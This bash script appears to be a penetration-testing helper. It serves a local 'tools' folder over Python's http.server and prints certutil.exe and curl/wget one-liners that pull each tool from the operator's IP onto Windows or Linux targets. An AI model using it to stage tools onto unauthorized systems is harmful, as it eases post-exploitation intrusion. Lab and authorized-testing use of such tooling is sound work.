#!/bin/bash

function help() {
    echo "Example: $0 -i tun0"
    echo "Example: $0 --interface eth0 --port 80"
    echo ""
    echo "    -h, --help"
    echo "        Prints this message."
    echo "    -i, --interface    <INTERFACE>"
    echo "        Set on which interface to listen."
    echo "    -p, --port    <PORT>"
    echo "        Set on which port to listen (default: 8000)."
    echo ""
    exit 1
}

PARSED_ARGUMENTS=$(getopt -a -n peh -o 'hi:p:' --long 'help,interface:,port:' -- "$@")
VALID_ARGUMENTS=$?
if [ "$VALID_ARGUMENTS" != "0" ]; then
  help
fi

eval set -- "$PARSED_ARGUMENTS"
while :
do
    case "$1" in
        -h | --help) PRINT_HELP=1 ; shift ;;
        -i | --interface) INTERFACE="$2" ; shift 2 ;;
        -p | --port) PORT="$2"; shift 2 ;;
        --) shift; break ;;
        *) echo "Unexpected option: $1 - this should not happen."; PRINT_HELP=1; break ;;
  esac
done

if [ "$PRINT_HELP" == "1" ]; then
    help
fi

if [ "$INTERFACE" == "" ];then
    echo "-i, --interface argument missing"
    echo "Pick one of the following interfaces:"
    ip a | grep ' mtu ' | cut -d' ' -f 2 | cut -d: -f 1
    exit 1
fi

if [ "$PORT" == "" ];then
    LPORT=8000
else
    LPORT=$PORT
fi

LHOST=$(ip a | grep "$INTERFACE" | grep inet | cut -d' ' -f 6 | cut -d'/' -f 1)

if [ "$LHOST" == "" ];then
    echo "Cannot extract IP address from the current interface ($INTERFACE)."
    echo "Check selected interface with 'ip a' command if it has assigned an IP address."
    exit 1
fi

cd tools

echo
echo
echo "WINDOWS TOOLS:"
echo

for TOOL in $(ls w); do
    TOOL_NAME=$(echo $TOOL | rev | cut -d'/' -f 1 | rev)
    echo "certutil.exe -urlcache -split -f http://$LHOST:$LPORT/w/$TOOL_NAME $TOOL_NAME"
done

echo
echo
echo "LINUX TOOLS:"
echo
for TOOL in $(ls l); do
    TOOL_NAME=$(echo $TOOL | rev | cut -d'/' -f 1 | rev)
    echo "curl http://$LHOST:$LPORT/l/$TOOL_NAME > $TOOL_NAME || wget http://$LHOST:$LPORT/l/$TOOL_NAME"
done

if [ $LPORT -lt 1024 ]; then
  echo "Port is less than 1024, you need to provide your password..."
  sudo python3 -m http.server $LPORT
else
  python3 -m http.server $LPORT
fi

